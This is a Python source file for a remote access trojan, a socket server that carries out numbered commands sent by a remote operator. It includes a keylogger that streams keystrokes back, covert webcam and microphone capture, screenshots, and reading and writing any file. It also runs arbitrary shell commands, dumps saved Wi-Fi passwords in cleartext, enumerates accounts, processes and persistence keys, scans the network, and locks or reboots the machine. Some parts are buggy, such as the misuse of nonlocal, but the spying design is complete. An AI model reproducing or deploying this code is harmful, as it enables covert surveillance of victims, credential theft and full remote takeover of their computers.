import socket
import subprocess
import threading
import pyaudio
import cv2
import pygetwindow as gw
from pynput import keyboard
from PIL import ImageGrab
import os
import psutil
import socket as sock
import platform
import netifaces
import socket
import struct
import fcntl
import ctypes
import webbrowser
import time
import pyautogui
import wave
import requests

# Configuration
HOST = '0.0.0.0'  # Listen on all available interfaces
PORT = 12345

# Global variables
camera_on = False
mic_on = False
keylogger_active = False
keylogger_results = []

def handle_client(client_socket):
    global camera_on, mic_on, keylogger_active, keylogger_results

    def turn_on_camera():
        nonlocal camera_on
        camera_on = True
        cap = cv2.VideoCapture(0)
        while camera_on:
            ret, frame = cap.read()
            if not ret:
                break
            cv2.imshow('Camera', frame)
            if cv2.waitKey(1) & 0xFF == ord('q'):
                break
        cap.release()
        cv2.destroyAllWindows()

    def turn_off_camera():
        nonlocal camera_on
        camera_on = False

    def turn_on_mic():
        nonlocal mic_on
        mic_on = True
        p = pyaudio.PyAudio()
        stream = p.open(format=pyaudio.paInt16, channels=1, rate=44100, input=True, frames_per_buffer=1024)
        while mic_on:
            data = stream.read(1024)
        stream.stop_stream()
        stream.close()
        p.terminate()

    def turn_off_mic():
        nonlocal mic_on
        mic_on = False

    def start_keylogger():
        nonlocal keylogger_active

        def on_press(key):
            try:
                keylogger_results.append(key.char)
            except AttributeError:
                keylogger_results.append(str(key))

        with keyboard.Listener(on_press=on_press) as listener:
            keylogger_active = True
            listener.join()

    def stop_keylogger():
        nonlocal keylogger_active
        keylogger_active = False

    def capture_screen():
        screenshot = ImageGrab.grab()
        screenshot.save('screenshot.png')

    def list_files(directory):
        try:
            return os.listdir(directory)
        except Exception as e:
            return str(e)

    def read_file(path):
        try:
            with open(path, 'r') as file:
                return file.read()
        except Exception as e:
            return str(e)

    def write_file(path, content):
        try:
            with open(path, 'w') as file:
                file.write(content)
            return "File written successfully"
        except Exception as e:
            return str(e)

    def list_processes():
        try:
            return [p.info for p in psutil.process_iter(['pid', 'name', 'username'])]
        except Exception as e:
            return str(e)

    def kill_process(pid):
        try:
            process = psutil.Process(pid)
            process.terminate()
            return True
        except psutil.NoSuchProcess:
            return False

    def scan_network(ip_range):
        results = []
        for ip in ip_range:
            try:
                sock.create_connection((ip, 80), 1)
                results.append(ip)
            except sock.error:
                pass
        return results

    def execute_command(command):
        try:
            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            return result.stdout + result.stderr
        except Exception as e:
            return str(e)

    def get_system_info():
        return platform.uname()

    def get_network_interfaces():
        return netifaces.interfaces()

    def get_active_connections():
        connections = psutil.net_connections(kind='inet')
        return [conn for conn in connections]

    def get_route_table():
        return netifaces.gateways()

    def get_dns_cache():
        return psutil.net_if_stats()

    def fetch_passwords():
        try:
            command = 'net user'
            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            return result.stdout
        except Exception as e:
            return str(e)

    def reboot_computer():
        try:
            os.system('shutdown /r /t 1')
        except Exception as e:
            return str(e)

    def freeze_screen():
        try:
            ctypes.windll.user32.LockWorkStation()
        except Exception as e:
            return str(e)

    def rick_roll():
        try:
            webbrowser.open('https://www.youtube.com/watch?v=dQw4w9WgXcQ')
        except Exception as e:
            return str(e)

    def record_audio(duration):
        try:
            p = pyaudio.PyAudio()
            stream = p.open(format=pyaudio.paInt16, channels=1, rate=44100, input=True, frames_per_buffer=1024)
            frames = []
            for i in range(0, int(44100 / 1024 * duration)):
                data = stream.read(1024)
                frames.append(data)
            stream.stop_stream()
            stream.close()
            p.terminate()
            wf = wave.open('output.wav', 'wb')
            wf.setnchannels(1)
            wf.setsampwidth(p.get_sample_size(pyaudio.paInt16))
            wf.setframerate(44100)
            wf.writeframes(b''.join(frames))
            wf.close()
            return "Audio recorded successfully"
        except Exception as e:
            return str(e)

    def move_mouse(x, y):
        try:
            pyautogui.moveTo(x, y)
        except Exception as e:
            return str(e)

    def click_mouse():
        try:
            pyautogui.click()
        except Exception as e:
            return str(e)

    def get_wifi_passwords():
        try:
            command = 'netsh wlan show profiles'
            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            profiles = [line.split(':')[1].strip() for line in result.stdout.split('\n') if 'All User Profile' in line]
            passwords = []
            for profile in profiles:
                command = f'netsh wlan show profile name="{profile}" key=clear'
                result = subprocess.run(command, shell=True, capture_output=True, text=True)
                password = [line.split(':')[1].strip() for line in result.stdout.split('\n') if 'Key Content' in line]
                passwords.append(f'{profile}: {password[0] if password else "No password"}')
            return '\n'.join(passwords)
        except Exception as e:
            return str(e)

    def get_installed_software():
        try:
            command = 'wmic product get name'
            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            return result.stdout
        except Exception as e:
            return str(e)

    def get_recent_files():
        try:
            command = 'powershell -Command "Get-ChildItem -Path C:\\Users\\*\\Recent\\ -Recurse -File | Select-Object FullName, LastWriteTime | Sort-Object LastWriteTime -Descending | Select-Object -First 10"'
            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            return result.stdout
        except Exception as e:
            return str(e)

    def get_startup_items():
        try:
            command = 'reg query "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v * /f'
            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            return result.stdout
        except Exception as e:
            return str(e)

    def get_scheduled_tasks():
        try:
            command = 'schtasks /query /fo LIST /v'
            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            return result.stdout
        except Exception as e:
            return str(e)

    def get_user_accounts():
        try:
            command = 'net user'
            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            return result.stdout
        except Exception as e:
            return str(e)

    def get_system_events():
        try:
            command = 'wevtutil qe System /c:10 /f:text'
            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            return result.stdout
        except Exception as e:
            return str(e)

    def fetch_github_content(url):
        try:
            response = requests.get(url)
            return response.text
        except Exception as e:
            return str(e)

    while True:
        try:
            # Receive the command from the client
            command = client_socket.recv(1024).decode('utf-8')
            if not command:
                break
            if command == '1':
                turn_on_camera()
            elif command == '2':
                turn_off_camera()
            elif command == '3':
                turn_on_mic()
            elif command == '4':
                turn_off_mic()
            elif command == '5':
                start_keylogger()
            elif command == '6':
                stop_keylogger()
            elif command == '7':
                client_socket.sendall(''.join(keylogger_results).encode('utf-8'))
            elif command == '8':
                capture_screen()
            elif command == '9':
                directory = client_socket.recv(1024).decode('utf-8')
                files = list_files(directory)
                client_socket.sendall('\n'.join(files).encode('utf-8'))
            elif command == '10':
                path = client_socket.recv(1024).decode('utf-8')
                content = read_file(path)
                client_socket.sendall(content.encode('utf-8'))
            elif command == '11':
                data = client_socket.recv(1024).decode('utf-8')
                path, content = data.split('\n')
                result = write_file(path, content)
                client_socket.sendall(result.encode('utf-8'))
            elif command == '12':
                processes = list_processes()
                client_socket.sendall('\n'.join(str(p) for p in processes).encode('utf-8'))
            elif command == '13':
                pid = client_socket.recv(1024).decode('utf-8')
                success = kill_process(pid)
                client_socket.sendall(str(success).encode('utf-8'))
            elif command == '14':
                ip_range = client_socket.recv(1024).decode('utf-8')
                ips = ip_range.split(',')
                results = scan_network(ips)
                client_socket.sendall('\n'.join(results).encode('utf-8'))
            elif command == '15':
                cmd = client_socket.recv(1024).decode('utf-8')
                result = execute_command(cmd)
                client_socket.sendall(result.encode('utf-8'))
            elif command == '16':
                info = get_system_info()
                client_socket.sendall(str(info).encode('utf-8'))
            elif command == '17':
                interfaces = get_network_interfaces()
                client_socket.sendall('\n'.join(interfaces).encode('utf-8'))
            elif command == '18':
                connections = get_active_connections()
                client_socket.sendall('\n'.join(str(conn) for conn in connections).encode('utf-8'))
            elif command == '19':
                route = get_route_table()
                client_socket.sendall(str(route).encode('utf-8'))
            elif command == '20':
                dns = get_dns_cache()
                client_socket.sendall(str(dns).encode('utf-8'))
            elif command == '21':
                passwords = fetch_passwords()
                client_socket.sendall(passwords.encode('utf-8'))
            elif command == '22':
                reboot_computer()
            elif command == '23':
                freeze_screen()
            elif command == '24':
                rick_roll()
            elif command == '25':
                duration = client_socket.recv(1024).decode('utf-8')
                record_audio(int(duration))
            elif command == '26':
                data = client_socket.recv(1024).decode('utf-8')
                x, y = data.split('\n')
                move_mouse(int(x), int(y))
            elif command == '27':
                click_mouse()
            elif command == '28':
                passwords = get_wifi_passwords()
                client_socket.sendall(passwords.encode('utf-8'))
            elif command == '29':
                software = get_installed_software()
                client_socket.sendall(software.encode('utf-8'))
            elif command == '30':
                recent_files = get_recent_files()
                client_socket.sendall(recent_files.encode('utf-8'))
            elif command == '31':
                startup_items = get_startup_items()
                client_socket.sendall(startup_items.encode('utf-8'))
            elif command == '32':
                scheduled_tasks = get_scheduled_tasks()
                client_socket.sendall(scheduled_tasks.encode('utf-8'))
            elif command == '33':
                user_accounts = get_user_accounts()
                client_socket.sendall(user_accounts.encode('utf-8'))
            elif command == '34':
                system_events = get_system_events()
                client_socket.sendall(system_events.encode('utf-8'))
            elif command == '35':
                url = client_socket.recv(1024).decode('utf-8')
                content = fetch_github_content(url)
                client_socket.sendall(content.encode('utf-8'))
        except Exception as e:
            client_socket.sendall(str(e).encode('utf-8'))

def start_server():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((HOST, PORT))
        s.listen()
        print(f'Server listening on {HOST}:{PORT}')
        while True:
            client_socket, addr = s.accept()
            print(f'Connected by {addr}')
            client_handler = threading.Thread(target=handle_client, args=(client_socket,))
            client_handler.start()

if __name__ == '__main__':
    start_server()
